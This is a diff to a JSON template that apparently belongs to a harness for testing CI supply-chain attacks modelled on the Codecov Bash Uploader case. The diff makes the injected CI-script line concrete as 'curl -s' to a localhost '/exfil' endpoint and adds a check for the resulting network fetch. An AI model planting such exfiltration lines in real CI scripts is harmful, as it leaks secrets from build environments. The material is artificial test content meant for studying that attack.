@@ -6,28 +6,34 @@
   "scheme": "dependency_aware",
   "mode": "insert_after",
   "injection_location": {
-    "file_glob": "{{CI_SCRIPT_GLOB}}",
+    "file_glob": "ci/*.sh",
     "field": "script_line"
   },
   "placeholders": {
     "CI_SCRIPT_FILE": "relative path to the CI script selected for modification",
     "ANCHOR_LINE": "existing script line used as the insertion point",
-    "CI_SCRIPT_GLOB": "project-relative glob identifying eligible CI scripts"
+
   },
   "attacker_values": {
-    "INJECTED_SCRIPT_LINE": "ATTACKER_CONTROLLED_ENVIRONMENT_DATA_EXFILTRATION_LOGIC"
+   "EXFIL_URL": "http://127.0.0.1:8000/exfil?data=pwned"
   },
   "template": {
     "file_path": "{{CI_SCRIPT_FILE}}",
     "anchor": "{{ANCHOR_LINE}}",
-    "replacement_value": "{{INJECTED_SCRIPT_LINE}}"
+    "replacement_value": "curl -s {{EXFIL_URL}}"
   },
   "preconditions": [
-    "project or CI workflow executes a script fetched from a remote source",
-    "the attacker can modify the hosted script or its delivered contents",
-    "the script executes in a CI environment with access to sensitive variables",
-    "the placement engine supports script-line anchors and insert_after mode"
+    "project or CI workflow executes a script during test execution",
+    "the attacker can modify the script content or its delivered contents",
+    "the script executes in an environment with access to variables or network connectivity"
   ],
+    "effect": {
+    "observable": "network_fetch",
+    "check": {
+      "request_path": "/exfil"
+    },
+    "requires": []
+  },
   "source_attacks": [
     "Codecov Bash Uploader (2021)"
   ]
